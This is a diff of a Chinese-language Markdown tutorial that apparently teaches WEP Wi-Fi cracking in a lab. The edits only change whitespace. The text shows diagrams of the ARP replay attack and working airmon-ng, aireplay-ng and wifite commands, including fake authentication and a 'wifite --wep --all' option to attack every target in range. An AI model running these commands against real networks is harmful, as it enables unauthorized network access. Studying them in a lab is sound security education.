@@ -20,15 +20,15 @@
 
 ```mermaid
 flowchart LR
-    A[明文数据] --> B[CRC-32计算ICV]
-    B --> C[明文 + ICV]
-    C --> D[RC4加密]
-    subgraph 密钥生成["密钥生成"]
-        E[24位IV + 40位WEP密钥] --> F[64位RC4种子]
-    end
-    F --> D
-    D --> G[IV 明文 + 密文]
-    G --> H[802.11 WEP帧]
+ A[明文数据] --> B[CRC-32计算ICV]
+ B --> C[明文 + ICV]
+ C --> D[RC4加密]
+ subgraph 密钥生成["密钥生成"]
+ E[24位IV + 40位WEP密钥] --> F[64位RC4种子]
+ end
+ F --> D
+ D --> G[IV 明文 + 密文]
+ G --> H[802.11 WEP帧]
 ```
 
 WEP帧格式：
@@ -65,18 +65,18 @@ WEP帧格式：
 
 ```mermaid
 sequenceDiagram
-    participant A as 攻击者
-    participant AP as 目标AP
-    participant C as 合法客户端
+ participant A as 攻击者
+ participant AP as 目标AP
+ participant C as 合法客户端
 
-    C->>AP: ARP请求(加密)
-    A->>A: 嗅探到ARP包(固定长度可识别)
-    A->>AP: 重放ARP包
-    AP->>C: ARP响应(加密)
-    Note over A,AP: 每次ARP响应产生新的IV
-    A->>AP: 持续重放 × N次
-    Note over A: 收集大量不同IV的密文
-    A->>A: 统计攻击(PTW)推导WEP密钥
+ C->>AP: ARP请求(加密)
+ A->>A: 嗅探到ARP包(固定长度可识别)
+ A->>AP: 重放ARP包
+ AP->>C: ARP响应(加密)
+ Note over A,AP: 每次ARP响应产生新的IV
+ A->>AP: 持续重放 × N次
+ Note over A: 收集大量不同IV的密文
+ A->>A: 统计攻击(PTW)推导WEP密钥
 ```
 
 为什么ARP包适合作重放？
@@ -93,18 +93,18 @@ sequenceDiagram
 
 ```mermaid
 flowchart TD
-    A[启动监听模式] --> B[定向扫描目标WEP网络]
-    B --> C[伪关联 Fake Auth]
-    C --> D{关联成功?}
-    D -->|是| E[ARP重放攻击]
-    D -->|否| C
-    E --> F[监控#Data列增长]
-    F --> G{IV >= 5000?}
-    G -->|否| E
-    G -->|是| H[aircrack-ng破解]
-    H --> I{KEY FOUND?}
-    I -->|是| J[破解成功]
-    I -->|否| E
+ A[启动监听模式] --> B[定向扫描目标WEP网络]
+ B --> C[伪关联 Fake Auth]
+ C --> D{关联成功?}
+ D -->|是| E[ARP重放攻击]
+ D -->|否| C
+ E --> F[监控#Data列增长]
+ F --> G{IV >= 5000?}
+ G -->|否| E
+ G -->|是| H[aircrack-ng破解]
+ H --> I{KEY FOUND?}
+ I -->|是| J[破解成功]
+ I -->|否| E
 ```
 
 ### 2.2 详细步骤
@@ -114,7 +114,7 @@ flowchart TD
 ```bash
 sudo airmon-ng check kill
 sudo airmon-ng start wlan0
-sudo iwconfig wlan0mon  # 确认Mode=Monitor
+sudo iwconfig wlan0mon # 确认Mode=Monitor
 ```
 
 **步骤二：定向扫描目标WEP网络**
@@ -150,10 +150,10 @@ sudo aireplay-ng -1 0 -a AA:BB:CC:DD:EE:FF -e WEP_Lab wlan0mon
 
 成功输出示例：
 ```
-18:25:32  Sending Authentication Request (Open System)
-18:25:32  Authentication successful
-18:25:32  Sending Association Request
-18:25:32  Association successful :-)
+18:25:32 Sending Authentication Request (Open System)
+18:25:32 Authentication successful
+18:25:32 Sending Association Request
+18:25:32 Association successful :-)
 ```
 
 **步骤四：ARP请求重放攻击**
@@ -260,10 +260,10 @@ sudo wifite --wep
 
 高级用法：
 ```bash
-sudo wifite --wep --all                      # 攻击所有目标
-sudo wifite --wep -b AA:BB:CC:DD:EE:FF       # 指定目标
-sudo wifite --wep -c 6                        # 指定信道
-sudo wifite --wep -pwr -50                    # 最小信号强度阈值
+sudo wifite --wep --all # 攻击所有目标
+sudo wifite --wep -b AA:BB:CC:DD:EE:FF # 指定目标
+sudo wifite --wep -c 6 # 指定信道
+sudo wifite --wep -pwr -50 # 最小信号强度阈值
 ```
 
 ### 3.2 wifite参数速查表
